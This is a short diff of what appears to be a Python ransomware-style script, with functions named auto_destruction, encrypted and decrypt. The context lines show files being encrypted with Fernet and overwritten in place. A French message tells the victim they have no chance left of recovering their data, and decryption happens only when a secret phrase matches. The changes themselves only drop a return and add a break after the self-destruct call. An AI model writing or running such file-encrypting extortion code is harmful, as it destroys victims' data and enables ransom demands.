@@ -25,7 +25,6 @@ def auto_destruction():
         contents_encrypted = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)
-    return 0
 
 
 def encrypted():
@@ -81,6 +80,7 @@ def decrypt():
             print("Vous n'avez plus aucune chance de retrouvé vos données")
             dead=True
             auto_destruction()
+            break
 
     if user_phrase == secretphrase:
         for file in files:
